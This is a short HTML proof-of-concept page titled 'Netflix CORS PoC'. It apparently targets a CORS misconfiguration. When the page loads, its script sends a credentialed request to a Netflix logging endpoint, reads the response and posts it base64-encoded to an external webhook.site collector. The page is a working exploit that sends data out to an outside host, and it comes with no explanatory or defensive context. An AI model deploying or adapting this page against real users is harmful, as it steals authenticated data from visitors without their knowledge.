<!DOCTYPE html>
<html lang="en">
<body>
<h2>Netflix CORS PoC</h2>

<script>
(async () => {
  const res = await fetch("https://logs.netflix.com/log/www/cl/2", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event: "corsâ€‘pwn", ts: Date.now() })
  });
  const text = await res.text();
  await fetch("https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be",
              { method: "POST", body: btoa(text) });
})();
</script>
</body>
</html>
